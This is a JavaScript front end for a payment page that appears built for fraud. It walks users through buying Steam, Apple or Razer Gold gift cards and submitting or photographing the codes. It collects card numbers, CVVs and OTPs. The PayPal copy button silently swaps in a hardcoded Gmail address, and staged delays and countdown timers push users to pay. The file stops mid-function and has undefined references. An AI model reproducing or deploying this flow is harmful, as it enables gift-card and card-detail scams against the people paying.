document.addEventListener("DOMContentLoaded", () => {
    // Initialize state and DOM elements
    const state = initializeState();
    const elements = cacheDOMElements();

    // Setup event listeners
    setupEventListeners(state, elements);

    // Initialize payment flow
    initializePaymentFlow(state, elements);
});

// ==================== STATE MANAGEMENT ====================
function initializeState() {
    return {
        currencySelected: false,
        methodSelected: false,
        selectedCurrency: "",
        currencyCode: "EUR",
        selectedMethod: "",
        converted: "",
        amount: 0,
        txn: "",
        charge: 0.98,
        toPay: 0,
        creditCardIndex: 0,  
        paypalIndex: 0,
        cardIndex: 0,
        giftCardIndex: 0,
        senderName: "",
        senderName: "",
        paymentStatus: null,
        creditCardSection: null,
        paypalSections: null,
        BankSection: null,
        redeemSections: null,
        cardAmount: 0,
        paymentTimer: null,
        giftCardTutorial: {
            currentStep: 0,
            type: "store",
            online: [
                {
                    image: "/src/images/paypal.jpeg",
                    title: "Step 1: Visit a Trusted Gift Card Website",
                    description: `Start by visiting a secure and trusted French website where digital gift cards are sold. In this image, the user is on a site like <a href="https://www.giftcards-website.fr" target="_blank">giftcards-website.fr</a>, where Steam, Apple, and Razer Gold cards are listed. Make sure the address bar shows "https://" and a padlock icon to confirm it’s secure. Then click on “Parcourir” to view available cards.`
                },
                {
                    image: "https://example.com/giftcard-step2.jpg",
                    title: "Step 2: Choose the Gift Card Type",
                    description: "Here, the user selects a gift card from the available options on a secure French site. Only select accepted brands: Steam, Apple, or Razer Gold. In the image, the user taps on a €50 Apple card. Make sure the card is clearly marked with the correct value and brand before continuing."
                },
                {
                    image: "https://example.com/giftcard-step3.jpg",
                    title: "Step 3: Enter Payment Details Securely",
                    description: "Now you're on the Paiement sécurisé page. Fill in your credit card number, expiration date, CVV (cryptogramme visuel), and billing address. Make sure the details are accurate. Then click the Continuer button to confirm your payment. Always ensure you're on a secure website before entering this information."
                },
                {
                    image: "https://example.com/giftcard-step4.jpg",
                    title: "Step 4: Payment Confirmation Screen",
                    description: `After completing your payment, you’ll see a confirmation message like this:
'Merci pour votre commande' (Thank you for your order).
<br/>
It also states that a confirmation email has been sent to you. Tap 'Retour à la commande' if you'd like to return to the site or view more details. Now check your email inbox to receive your digital gift card code.`
                },
                {
                    image: "https://example.com/giftcard-step4.jpg",
                    title: "Step 5: Open Your Email and Copy the Gift Card Code",
                    description: "You’ll receive an email like this titled 'Votre code de carte cadeau numérique' (Your digital gift card code). It includes the code you’ll need to redeem on the payment platform. Carefully copy the code exactly as shown. Keep the email saved in case you need to refer back to it later."
                },
               
            ],
            store: [
                {
                    image: "/src/images/paypal.jpeg",
                    title: "Step 1: Walk Into the Store",
                    description: "Start the physical gift card process by walking into a major retail store or supermarket in France. Look for stores like Carrefour, Monoprix, Intermarché, or Fnac. These places usually have a dedicated section for gift cards. Once inside, head toward the electronics, checkout, or prepaid card section."
                },
                {
                    image: "https://example.com/giftcard-step2.jpg",
                    title: "Step 2: Locate the Gift Card Section and Select an Accepted Card",
                    description: "Inside the store, look for the rack labeled 'Cartes Cadeaux' (Gift Cards). You’ll find many brands, but only choose from these three: Steam, Apple, Razer Gold. <br/> Make sure the card is sealed and check the amount written on it, such as €20 or €50. Avoid buying unaccepted cards like Amazon, Netflix, or PlayStation"
                },
                {
                    image: "https://example.com/giftcard-step3.jpg",
                    title: "Step 3: Make Payment for the Gift Card",
                    description: "Once you've chosen your Steam, Apple, or Razer Gold gift card, take it to the checkout counter. The cashier will scan and activate it. Pay using cash, credit card, or mobile payment.\n Only after payment will the gift card be usable, so always ask for a receipt as proof."
                },
                {
                    image: "https://example.com/giftcard-step4.jpg",
                    title: "Step 4: Scratch the Card to Reveal the Code",
                    description: "After payment, gently scratch the silver coating on the back of the card using a coin or key. This will uncover your gift card code, which is needed to redeem or make a payment. Be careful not to damage the numbers or letters. Keep the card safe and readable."
                },
                {
                    image: "https://example.com/giftcard-step4.jpg",
                    title: "Step 5: Enter the Code on Our Payment Platform",
                    description: "Once the code is revealed, visit our redeem code payment site. Type in the exact characters shown on the card into the Enter Code box. Select the correct Card Type (Steam, Apple, or Razer Gold), enter the Amount, and then tap Redeem to finalize the process. <br/>Make sure the code is correctly entered — no spaces or typos."
                },
                {
                    image: "https://example.com/giftcard-step4.jpg",
                    title: "Step 6: Use Scan Code to Upload the Card Photo", description: " Instead of typing the code manually, you can scan the gift card using your phone. Just tap the Scan Code button on the site and position the card in front of your camera. <br/>Make sure the code is clearly visible and fully within the frame. The system will automatically read and extract the code from the image for payment.",
                },
            ]
        },
        selectedCardType: null,
        scannedImage: null,
        giftCardCode: "",
        acceptedCards: [
            { name: "Steam", image: "https://upload.wikimedia.org/wikipedia/commons/8/83/Steam_icon_logo.svg", },
            { name: "Razer Gold", image: "/src/images/razergold.jpeg" },
            { name: "Apple", image: "https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg", }
        ]
    };
}

function createCreditCardSections(state) {
    return {
        1: createCreditCardSection1(state),
        2: createCreditCardSection2(state),
        3: createCreditCardSection3(state)
    };
}

function createPaypalSections(state) {
    return {
        1: createPaypalSection1(),
        2: createPaypalSection2(state),
        3: createPaypalSection3(state),
        4: createPaypalSection4(),
        5: createPaypalSection5(state),
    };
}

function createBankSection(state) {
    return {
        1: createBankSection1(),
        2: createBankSection2(state),
        3: createBankSection3(state),
        4: createBankSection4(),
        5: createBankSection5(state),
    };
}

function createRedeemSections(state) {
    return {
        1: createGiftCardInstructionPage(state),
        2: createGiftCardRedeemPage(state),
    };
}

// ==================== DOM CACHING ====================
function cacheDOMElements() {
    return {
        currencyContinueBtn: document.getElementById("currency-continue"),
        makePaymentBtn: document.getElementById("make-payment-btn"),
        usdOption: document.getElementById("usd-option"),
        usdDropdown: document.getElementById("usd-dropdown"),
        currencyOptions: document.querySelectorAll(
            "#currency-section .option-item"
        ),
        currencyDropdownItems: document.querySelectorAll(".currency-dropdown-item"),
        paymentMethodOptions: document.querySelectorAll(
            "#payment-method-section label.option-item"
        ),
        currencyCode: document.querySelector("span.choosen-currency-code"),
        convertedText: document.querySelector("h2.converted"),
        titleDiv: document.querySelector(
            "#conversion-section .option-list p.title"
        ),
        paymentDisplay: document.querySelector("section#display.parent"),
    };
}

// ==================== EVENT LISTENERS ====================
function setupEventListeners(state, elements) {
    // Currency selection
    elements.usdOption.addEventListener("click", (e) =>
        handleUsdOptionClick(e, state, elements)
    );
    elements.currencyDropdownItems.forEach((item) => {
        item.addEventListener("click", () =>
            handleCurrencyDropdownClick(item, state, elements)
        );
    });
    elements.currencyOptions.forEach((option) => {
        option.addEventListener("click", (e) =>
            handleCurrencyOptionClick(e, option, state, elements)
        );
    });

    // Payment method selection
    elements.paymentMethodOptions.forEach((option) => {
        option.addEventListener("click", () =>
            handlePaymentMethodClick(option, state, elements)
        );
    });

    // Button actions
    document
        .getElementById("proceed-button")
        ?.addEventListener("click", (e) => handleProceedClick(e));
    elements.currencyContinueBtn?.addEventListener("click", (e) =>
        handleCurrencyContinueClick(e, state, elements)
    );
    document
        .getElementById("choose-method-btn")
        ?.addEventListener("click", (e) => handleChooseMethodClick(e));
    elements.makePaymentBtn?.addEventListener("click", (e) =>
        handleMakePaymentClick(e, state, elements)
    );

    document.addEventListener('click', function (e) {
        if (e.target.closest('.learn-more.redeem')) {
            e.preventDefault();
            state.giftCardTutorial.currentStep = 0;
            elements.paymentDisplay.innerHTML = '';
            elements.paymentDisplay.insertAdjacentHTML('beforeend', createGiftCardTutorialSection(state));
            setupTutorialNavigation(state, elements);
        }
    });
}

// ==================== EVENT HANDLERS ====================
function handleUsdOptionClick(e, state, elements) {
    if (!e.target.closest(".currency-dropdown-item")) {
        document
            .querySelector(".currency-option-container")
            .classList.toggle("open");
        elements.usdDropdown.classList.toggle("show");
        state.currencySelected = true;
    }
}

function handleCurrencyDropdownClick(item, state, elements) {
    const code = item.querySelector(".currency-code")?.textContent;
    const currency =
        item.querySelector("p")?.textContent ||
        item.textContent.trim().split(" ").slice(1).join(" ");

    const optionLabel = elements.usdOption.querySelector(".option-label");
    optionLabel.innerHTML = `${currency} <span class="option-subtext">${code}</span>`;

    updateCurrencyState(state, code, currency);
    closeCurrencyDropdown(elements);
    updateSelectionStyles(elements.usdOption, elements.currencyOptions);
    checkCurrencySelection(state, elements);
}

function handleCurrencyOptionClick(e, option, state, elements) {
    if (option === elements.usdOption || e.target.closest(".currency-dropdown"))
        return;

    if (
        option !== elements.usdOption &&
        !e.target.closest(".currency-dropdown")
    ) {
        const code = option.querySelector(".option-subtext")?.textContent || "";
        const currency =
            option.querySelector(".option-label")?.textContent ||
            option.textContent.trim().split(" ").slice(1).join(" ");

        updateSelectionStyles(option, elements.currencyOptions);
        updateCurrencyState(state, code, currency);

        closeCurrencyDropdown(elements);
        checkCurrencySelection(state, elements);
    }
}

function handlePaymentMethodClick(option, state, elements) {
    const method = option.querySelector(".option-label").textContent;
    state.methodSelected = true;
    state.selectedMethod = method.toString().replace(" ", "");

    updateSelectionStyles(option, elements.paymentMethodOptions);

    checkPaymentMethodSelection(state, elements);
}

function handleProceedClick(e) {
    e.preventDefault();
    const button = e.target;
    button.disabled = true;
    button.textContent = "Processing...";

    setTimeout(() => {
        document.getElementById("payment-details")?.classList.remove("active");
        document.getElementById("currency-section")?.classList.add("active");
        button.disabled = false;
        button.textContent = "Proceed to Payment";
    }, 2000);
}

async function handleCurrencyContinueClick(e, state, elements) {
    e.preventDefault();
    const button = e.target;
    button.disabled = true;
    button.textContent = "Converting...";

    try {
        if (state.currencyCode !== "EUR") {
            await convertCurrency(state, elements);
        } else {
            // Skip conversion for EUR
            document.getElementById("currency-section")?.classList.remove("active");
            document
                .getElementById("payment-method-section")
                ?.classList.add("active");
        }
    } catch (error) {
        console.error("Conversion error:", error);
        elements.titleDiv.innerHTML = "Error: Conversion service unavailable";

        document.getElementById("currency-section")?.classList.remove("active");
        document.getElementById("conversion-section")?.classList.add("active");
        document.getElementById("choose-method-btn").disabled = true;
    } finally {
        button.disabled = false;
        button.textContent = "Continue";
    }
}

function handleChooseMethodClick(e) {
    e.preventDefault();
    const button = e.target;
    button.disabled = true;
    button.textContent = "Redirecting...";

    setTimeout(() => {
        document.getElementById("conversion-section")?.classList.remove("active");
        document.getElementById("payment-method-section")?.classList.add("active");
        button.disabled = false;
        button.textContent = "Choose Method";
    }, 2000);
}

function handleMakePaymentClick(e, state, elements) {
    e.preventDefault();
    const button = e.target;
    button.disabled = true;
    button.textContent = "Processing...";

    setTimeout(() => {
        document
            .getElementById("payment-method-section")
            ?.classList.remove("active");
        if (state.currencyCode === "EUR") {
            state.toPay = (
                parseFloat(state.amount) + parseFloat(state.charge)
            ).toFixed(2);
        }

        if (state.selectedMethod === "PayPal") {
            state.paypalSections = createPaypalSections(state);
            handlePaypal(state, elements);
        } else if (state.selectedMethod.includes("Bank")) {
            state.BankSection = createBankSection(state);
            handleBank(state, elements);
        } else if (state.selectedMethod.includes("Credit")) {
            state.creditCardSections = createCreditCardSections(state);
            handleCreditCard(state, elements);
        } else if (state.selectedMethod.includes("Redeem")) {
            state.redeemSections = createRedeemSections(state);
            handleGiftCardFlow(state, elements);
        }
        else {
            document.getElementById("loading-section")?.classList.add("active");
        }
    }, 2000);
}

function getCurrencySymbol(currencyCode) {
    const symbols = {
        EUR: "€",
        USD: "$",
        CAD: "$",
        AUD: "$",
        GBP: "£",
        CHF: "₣",
    };
    return symbols[currencyCode] || currencyCode;
}

function initializeCreditCardState() {
    return {
        cardBrands: [
            {
                name: "Visa",
                image: "https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg",
                colors: ["#1a1f71", "#ffffff"], // Blue and white
                pattern: "linear-gradient(135deg, #1a1f71 0%, #1a1f71 50%, #f7b600 50%, #f7b600 100%)"
            },
            {
                name: "Mastercard",
                image: "https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg",
                colors: ["#eb001b", "#f79e1b"], // Red and orange
                pattern: "linear-gradient(135deg, #eb001b 0%, #eb001b 50%, #f79e1b 50%, #f79e1b 100%)"
            },
            {
                name: "American Express",
                image: "https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg",
                colors: ["#016fd0", "#ffffff"], // Blue and white
                pattern: "linear-gradient(135deg, #016fd0 0%, #016fd0 70%, #ffffff 70%, #ffffff 100%)"
            },
            {
                name: "Discover",
                image: "https://upload.wikimedia.org/wikipedia/commons/5/57/Discover_Card_logo.svg",
                colors: ["#ff6000", "#ffffff"], // Orange and white
                pattern: "linear-gradient(135deg, #ff6000 0%, #ff6000 60%, #ffffff 60%, #ffffff 100%)"
            }
        ],
        detectedBrand: null
    };
}

// =============
// ===========
// ====P====

// ==================== CREDIT CARD HANDLING ====================
function handleCreditCard(state, elements) {
    state.creditCardSections = createCreditCardSections(state);
    const currentSection = state.creditCardSections[state.creditCardIndex + 1];

    if (currentSection) {
        elements.paymentDisplay.innerHTML = '';
        elements.paymentDisplay.insertAdjacentHTML('beforeend', currentSection);

        // Add click handlers for CC buttons
        document.querySelectorAll(".cc-btn").forEach(btn => {
            btn.addEventListener('click', () => {
                state.creditCardIndex++;

                // // Handle form submission on last section
                if (state.creditCardIndex + 1 === Object.keys(state.creditCardSections).length) {
                    processCreditCardPayment(state);

                }

                if (btn.classList.contains('verify-otp')) {
                    verifyOTP(state, elements);
                    return;
                }

                handleCreditCard(state, elements);
            });
        });

        if (state.creditCardIndex === 0) {
            setupCreditCardInputs(state);
        }

        if (state.creditCardIndex === 1) {
            processCreditCardPayment(state);
        }
    }
}

function setupCreditCardInputs(state) {
    const cardNumber = document.getElementById('card-number');
    const expiryDate = document.getElementById('expiry-date');
    const cvv = document.getElementById('cvv');
    const cardName = document.getElementById('card-name');
    const submitBtn = document.querySelector('#credit-card-details .cc-btn');
    const cardState = initializeCreditCardState();

    function detectCardBrand(number) {
        const cleaned = number.replace(/\s+/g, '');
        if (/^4/.test(cleaned)) return "Visa";
        if (/^5[1-5]/.test(cleaned)) return "Mastercard";
        if (/^3[47]/.test(cleaned)) return "American Express";
        if (/^6(?:011|5)/.test(cleaned)) return "Discover";
        return null;
    }



    function validateInputs() {
        const isCardValid = cardNumber.value.replace(/\s/g, '').length >= 15;
        const isExpiryValid = /^\d{2}\s?\/\s?\d{2}$/.test(expiryDate.value);
        const isCvvValid = cvv.value.length >= 3 && cvv.value.length <= 4;
        const isNameValid = cardName.value.trim().length > 2;

        submitBtn.disabled = !(isCardValid && isExpiryValid && isCvvValid && isNameValid);
    }


    // Format card number with spaces
    if (cardNumber) {
        cardNumber.addEventListener('input', function (e) {
            let value = e.target.value.replace(/\s+/g, '');
            if (value.length > 0) {
                value = value.match(new RegExp('.{1,4}', 'g'))?.join(' ') || value;
            }
            e.target.value = value;
        
            // Detect card brand
            state.detectedBrand = detectCardBrand(value);
            validateInputs();
        
            // Update UI to show detected brand
            const cardBrands = document.querySelectorAll('.card-brand');
            cardBrands.forEach(brand => {
                brand.classList.remove('active');
                if (brand.querySelector('img').alt === state.detectedBrand) {
                    brand.classList.add('active');
                }
            });
        });
    }


 // Update card icon in input field
        const inputIcon = document.querySelector('.input-with-icon .card-icon');
        if (state.detectedBrand) {
            const brand = cardState.cardBrands.find(b => b.name === state.detectedBrand);
            if (!inputIcon) {
                const iconDiv = document.createElement('div');
                iconDiv.className = 'card-icon';
                iconDiv.style.background = brand.pattern;
                iconDiv.innerHTML = `<img src="${brand.image}" alt="${brand.name}">`;
                document.querySelector('.input-with-icon').appendChild(iconDiv);
            } else {
                inputIcon.style.background = brand.pattern;
                inputIcon.innerHTML = `<img src="${brand.image}" alt="${brand.name}">`;
            }
        } else if (inputIcon) {
            inputIcon.remove();
        }


    // Format expiration date
    if (expiryDate) {
        expiryDate.addEventListener('input', function (e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            e.target.value = value;
            validateInputs();
        });
    }

    // Validate CVV
    if (cvv) {
        cvv.addEventListener('input', function () {
            this.value = this.value.replace(/\D/g, '');
            validateInputs();
        });
    }

    // Validate card name
    if (cardName) {
        cardName.addEventListener('input', validateInputs);
    }

    // Initial validation
    validateInputs();
}

function processCreditCardPayment(state) {
    handleCreditCard(state, elements);
    console.log('first done');

    setTimeout(() => {
        // After "backend" responds, show OTP section
        state.creditCardIndex++;
        state.paymentStatus = true;

        console.log('second done');

        handleCreditCard(state, elements);
        showPaymentResult(state);

        console.log('completed');

        // In a real app, you would:
        // 1. Send card details to backend
        // 2. Wait for response
        // 3. If success, show OTP section
        // 4. If error, show error message
    }, 2000);

    // setTimeout(() => {
    //     state.paymentStatus = true; 
    // }, 3000);
}

function verifyOTP(state, elements) {
    const otpInput = document.getElementById('otp-code');
    const otpFeedback = document.querySelector('.otp-feedback');
    const otpMessage = document.querySelector('.otp-message');
    const verifyBtn = document.querySelector('.verify-otp');

    if (!otpInput || !otpInput.value) {
        showOTPFeedback(otpFeedback, otpMessage, "Please enter the OTP code", false);
        return;
    }

    // Disable button and show processing
    verifyBtn.disabled = true;
    verifyBtn.textContent = "Verifying...";
    otpInput.disabled = true;

    verifyBtn.innerHTML = '<div class="mini-spinner"></div> Verifying...';

    setTimeout(() => {
        // This would be replaced with actual API call
        const otpValid = otpInput.value === "123456"; // Test OTP

        if (otpValid) {
            showOTPFeedback(otpFeedback, otpMessage, "OTP verified successfully!", true);

            // Process to success screen
            setTimeout(() => {
                state.paymentStatus = true;
                showPaymentResult(state);
            }, 1000);
        } else {
            showOTPFeedback(otpFeedback, otpMessage, "Incorrect OTP code", false);

            // Re-enable inputs
            verifyBtn.disabled = false;
            verifyBtn.textContent = "Submit";
            otpInput.disabled = false;
            otpInput.focus();
        }
    }, 1500);
}

function showOTPFeedback(container, messageEl, message, isSuccess) {
    container.style.display = "block";
    messageEl.textContent = message;
    messageEl.className = isSuccess ? "otp-message success" : "otp-message error";

    // Auto-hide success message after 3 seconds
    if (isSuccess) {
        setTimeout(() => {
            container.style.display = "none";
        }, 3000);
    }
}

function showPaymentResult(state) {
    const resultHTML = `
    <div class="payment-section credit-card-section active" id="payment-result">
        <div class="result-content">
            <div class="icon">
                <i class="fas ${state.paymentStatus ? 'fa-check-circle success' : 'fa-times-circle error'}"></i>
            </div>
            <h2>Payment ${state.paymentStatus ? 'Successful' : 'Failed'}</h2>
            <p>${state.paymentStatus ? 'Your payment was processed successfully!' : 'There was an error processing your payment.'}</p>
            
            <div class="transaction-details">
                <p>Amount: ${getCurrencySymbol(state.currencyCode)}${state.toPay}</p>
                <p>Transaction ID: ${state.txn}</p>
            </div>
            
            <div class="proceed-div">
                <button class="continue-btn" onclick="window.location.href='/html/main/User.html'">
                    ${state.paymentStatus ? 'Continue' : 'Try Again'}
                </button>
            </div>
        </div>
    </div>`;

    document.querySelector("section#display.parent").innerHTML = resultHTML;
}



// =============
// ===========
// ====PAS====

// ==================== PAYPAL HANDLING ====================
function handlePaypal(state, elements) {
    state.paypalSections = createPaypalSections(state);

    const currentSection = state.paypalSections[state.paypalIndex + 1];

    if (currentSection) {
        // Clear and render new section
        elements.paymentDisplay.innerHTML = "";
        elements.paymentDisplay.insertAdjacentHTML("beforeend", currentSection);

        // Add click handlers for PayPal buttons
        document.querySelectorAll(".paypal-btn").forEach((btn) => {
            btn.addEventListener("click", () => {
                state.paypalIndex++;
                handlePaypal(state, elements);
            });
        });

        document.querySelectorAll(".copy").forEach((btn) => {
            btn.addEventListener("click", (e) => handleCopyClick(e, state));
        });

        if (state.paypalIndex + 1 === 4) {
            setupUploadSection(state);
        }

        // Start countdown timer when section 3 is shown
        if (state.paypalIndex + 1 === 3) {
            startPaymentTimer(state);
        }
    } else {
        // Handle completion
        if (state.paymentStatus === false) {
            showPaymentError();
        } else {
            showPaymentSuccess();
        }
    }
}

// =============
// ===========
// ====Q====


// ==================== BANK HANDLING ====================
function handleBank(state, elements) {
    state.BankSection = createBankSection(state);

    const currentSection = state.BankSection[state.cardIndex + 1];

    if (currentSection) {
        // Clear and render new section
        elements.paymentDisplay.innerHTML = "";
        elements.paymentDisplay.insertAdjacentHTML("beforeend", currentSection);

        // Add click handlers for PayPal buttons
        document.querySelectorAll(".card-btn").forEach((btn) => {
            btn.addEventListener("click", () => {
                state.cardIndex++;
                handleBank(state, elements);
            });
        });

        document.querySelectorAll(".card-section .copy").forEach((btn) => {
            btn.addEventListener("click", (e) => handleCopyClick(e, state));
        });

        document.querySelectorAll(".view-details").forEach(btn => {
            btn.addEventListener("click", () => showDetails());
        });

        document.querySelectorAll(".util-btn.cancel").forEach(btn => {
            btn.addEventListener("click", () => showStillProcessing());
        });


        if (state.cardIndex + 1 === 4) {
            setupUploadSection(state);
        }

        // Start countdown timer when section 3 is shown
        if (state.cardIndex + 1 === 3) {
            startPaymentTimer(state);
        }
    }
}

// ==================== GIFT CARD HANDLERS ====================
function handleGiftCardFlow(state, elements) {
    const container = elements.paymentDisplay;
    container.innerHTML = '';

    if (state.giftCardIndex === 0) {
        container.insertAdjacentHTML('beforeend', createGiftCardInstructionPage(state));

        // Add click handler for "Got it" button
        document.querySelector('.got-it-btn').addEventListener('click', () => {
            state.giftCardIndex = 1;
            handleGiftCardFlow(state, elements);
        });
    } else {
        container.insertAdjacentHTML('beforeend', createGiftCardRedeemPage(state));

        // Initialize dropdown functionality
        setupCardTypeDropdown(state, elements);

        // Setup form validation
        setupGiftCardFormValidation(state);
    }
}

function setupCardTypeDropdown(state, elements) {
    const display = elements.paymentDisplay;

    const dropdown = document.getElementById('card-type-selector');

    display.addEventListener('click', () => {
        dropdown.classList.toggle('show');
    });

    document.querySelectorAll('.card-option').forEach(option => {
        option.addEventListener('click', () => {
            state.selectedCardType = option.dataset.type;
            display.innerHTML = `
                <img src="${option.querySelector('img').src}" alt="${option.dataset.type}">
                <span>${option.dataset.type}</span>
            `;
            dropdown.classList.remove('show');
            validateGiftCardForm(state);
        });
    });

    // Close dropdown when clicking outside
    document.addEventListener('click', (e) => {
        if (!e.target.closest('#card-type-selector')) {
            dropdown.classList.remove('show');
        }
    });
}


function setupGiftCardFormValidation(state) {
    const codeInput = document.getElementById('gift-card-code');
    const amountInput = document.getElementById('amount');
    const redeemBtn = document.querySelector('.redeem-btn');
    const scanBtn = document.getElementById('scan-code-btn');
    const cancelScanBtn = document.getElementById('cancel-scan-btn');

    function validateForm() {
        const hasCode = codeInput ? codeInput.value.trim().length > 0 : false;
        const hasAmount = amountInput ? amountInput.value.trim().length > 0 : false;

        state.giftCardCode = codeInput.value.trim();
        state.cardAmount = amountInput.value.trim();

        const isValid = state.selectedCardType &&
            (hasCode || state.scannedImage) &&
            hasAmount;

        if (redeemBtn) {
            redeemBtn.disabled = !isValid;
        }
    }

    codeInput.addEventListener('input', validateForm);
    amountInput.addEventListener('input', validateForm);

    // Camera functionality
    const cameraModal = document.getElementById('camera-modal');
    const closeCamera = document.querySelector('.close-camera');
    const captureBtn = document.getElementById('capture-btn');
    const videoElement = document.getElementById('camera-view');
    let stream = null;

    if (scanBtn) {
        scanBtn.addEventListener('click', async () => {
            try {
                cameraModal.style.display = 'flex';
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'environment',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                });
                videoElement.srcObject = stream;
            } catch (err) {
                console.error("Camera error:", err);
                alert("Could not access camera. Please enter code manually.");
            }
        });
    }

    if (closeCamera) {
        closeCamera.addEventListener('click', () => {
            cameraModal.style.display = 'none';
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        });
    }

    if (captureBtn) {
        captureBtn.addEventListener('click', () => {
            const canvas = document.createElement('canvas');
            const video = document.getElementById('camera-view');
            const scanningArea = document.querySelector('.scanning-area');

            // Get the actual video dimensions
            const videoWidth = video.videoWidth;
            const videoHeight = video.videoHeight;

            // Get the displayed dimensions
            const displayRect = video.getBoundingClientRect();
            const displayWidth = displayRect.width;
            const displayHeight = displayRect.height;

            const scaleX = videoWidth / displayWidth;
            const scaleY = videoHeight / displayHeight;

            const scanRect = scanningArea.getBoundingClientRect();

            const scanX = (scanRect.left - displayRect.left) * scaleX;
            const scanY = (scanRect.top - displayRect.top) * scaleY;
            const scanWidth = scanRect.width * scaleX;
            const scanHeight = scanRect.height * scaleY;

            canvas.width = scanWidth;
            canvas.height = scanHeight;

            const ctx = canvas.getContext('2d');
            ctx.drawImage(
                video,
                scanX, scanY, scanWidth, scanHeight,
                0, 0, scanWidth, scanHeight      
            );

            // Convert canvas to image and store in state
            canvas.toBlob(blob => {
                state.scannedImage = URL.createObjectURL(blob);
                cameraModal.style.display = 'none';
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
                // Refresh the view to show the scanned image
                handleGiftCardFlow(state, cacheDOMElements());
                validateForm();
            }, 'image/jpeg', 0.9);
        });
    }

    if (cancelScanBtn) {
        cancelScanBtn.addEventListener('click', () => {
            state.scannedImage = null;
            handleGiftCardFlow(state, cacheDOMElements());
            validateForm();
        });
    }

    // Handle card type selection
    const cardTypeSelect = document.getElementById('card-type-select');
    if (cardTypeSelect) {
        cardTypeSelect.addEventListener('change', (e) => {
            state.selectedCardType = e.target.value;
            validateForm();
            // Update the UI
            const preview = document.querySelector('.card-preview');
            if (state.selectedCardType) {
                if (!preview) {
                    const newPreview = document.createElement('div');
                    newPreview.className = 'card-preview';
                    newPreview.innerHTML = `
                        <img src="${getCardStyle(state.selectedCardType, 'image', state)}" 
                             alt="${state.selectedCardType}"
                             class="selected-card-image">
                    `;
                    cardTypeSelect.insertAdjacentElement('afterend', newPreview);
                } else {
                    preview.innerHTML = `
                        <img src="${getCardStyle(state.selectedCardType, 'image', state)}" 
                             alt="${state.selectedCardType}"
                             class="selected-card-image">
                    `;
                }
            } else if (preview) {
                preview.remove();
            }
        });
    }

    // Initial validation
    validateForm();
}


function setupTutorialNavigation(state, elements) {
    const container = document.getElementById('gift-card-tutorial');
    if (!container) return;


    // Close button
    container.querySelector('.close-tutorial').addEventListener('click', () => {
        container.classList.add('slide-out-right');
        setTimeout(() => {
            handleGiftCardFlow(state, elements);
        }, 300);
    });

    document.querySelectorAll(".tutorial-header .tutorial-tab .tab").forEach(tab => {
        tab.addEventListener('click', (e) => {
            if (tab.id === state.giftCardTutorial.type) return;
            else {


                container.classList.add('slide-out-right');

                const type = tab.id;
                state.giftCardTutorial.type = type;
                state.giftCardTutorial.currentStep = 0;


                setTimeout(() => {
                    container.outerHTML = createGiftCardTutorialSection(state);
                    setupTutorialNavigation(state, elements);
                    document.getElementById('gift-card-tutorial').classList.add('slide-in-left');
                }, 300);
            }
        })
    })

    // Previous button
    container.querySelector('.prev-btn').addEventListener('click', () => {
        if (state.giftCardTutorial.currentStep > 0) {
            container.classList.add('slide-out-right');
            setTimeout(() => {
                state.giftCardTutorial.currentStep--;
                container.outerHTML = createGiftCardTutorialSection(state);
                setupTutorialNavigation(state, elements);
                document.getElementById('gift-card-tutorial').classList.add('slide-in-left');
            }, 300);
        }
    });

    container.querySelector('.next-btn').addEventListener('click', (e) => {
        const type = state.giftCardTutorial.type;
        const isLastStep = state.giftCardTutorial.currentStep === state.giftCardTutorial[type].length - 1;

        if (isLastStep) {
            container.classList.add('slide-out-right');
            setTimeout(() => {
                handleGiftCardFlow(state, elements);
            }, 300);
        } else {
            container.classList.add('slide-out-left');
            setTimeout(() => {
                state.giftCardTutorial.currentStep++;
                container.outerHTML = createGiftCardTutorialSection(state);
                setupTutorialNavigation(state, elements);
                document.getElementById('gift-card-tutorial').classList.add('slide-in-right');
            }, 300);
        }
    });
}

function handleCopyClick(e, state) {
    const isEmail = e.target
        .closest(".info-div")
        .querySelector(".info-title")
        .textContent.includes("Email");

    const valueToCopy = e.target
        .closest(".info-div")
        .querySelector(".info-text").textContent;

    const amount = `${getCurrencySymbol(state.currencyCode)}${state.toPay}`;

    const textToCopy = state.selectedMethod == "PayPal" ? isEmail
        ? "paynowfunds@gmail.com"
        : amount.slice(1, amount.length) : valueToCopy;

    navigator.clipboard.writeText(textToCopy).then(() => {
        const originalText = e.target.textContent;
        e.target.textContent = "Copied!";
        setTimeout(() => {
            e.target.textContent = originalText;
        }, 2000);
    });
}

function setupUploadSection(state) {
    const uploadTrigger = document.getElementById("upload-trigger");
    const fileInput = document.getElementById("receipt-upload");
    const uploadFeedback = document.querySelector(".upload-feedback");
    const fileNameDisplay = document.querySelector(".file-name");
    const senderNameInput = document.getElementById("sender-name-input");
    const plusBTN = document.getElementById("add-button");
    const continueBTN = document.querySelector(".continue-btn");
    let uploaded = false;

    // Set initial sender name if it exists in state
    if (state.senderName) {
        senderNameInput.value = state.senderName;
    }

    // File upload handling
    uploadTrigger.addEventListener("click", () => fileInput.click());

    fileInput.addEventListener("change", (e) => {
        const file = e.target.files[0];
        if (file) {
            fileNameDisplay.textContent = `File: ${file.name}`;
            uploadFeedback.style.display = "block";
            plusBTN.className = `fas fa-check-circle success`;
            plusBTN.style.color = "#0006a";

            uploaded = true;
        }
    });

    // Sender name input handling
    senderNameInput.addEventListener("input", (e) => {
        const value = e.target.value.toString().trim();
        state.senderName = value;

        continueBTN.disabled = true;
        if (uploaded && value !== "") {
            continueBTN.disabled = false;
        }
    });
}

function startPaymentTimer(state) {
    let timeout = state.selectedMethod.includes("Bank") ? 120 : 30;

    let timeLeft = timeout * 60;

    const timerElement = document.getElementById("payment-timer");

    if (state.paymentTimer) {
        clearInterval(state.paymentTimer);
    }

    // Update timer immediately
    updateTimerDisplay(timerElement, timeLeft);

    // Start countdown
    state.paymentTimer = setInterval(() => {
        timeLeft--;

        // Update display
        updateTimerDisplay(timerElement, timeLeft);

        // Handle timer completion
        if (timeLeft <= 0) {
            clearInterval(state.paymentTimer);
            timerExpired(state);
        }

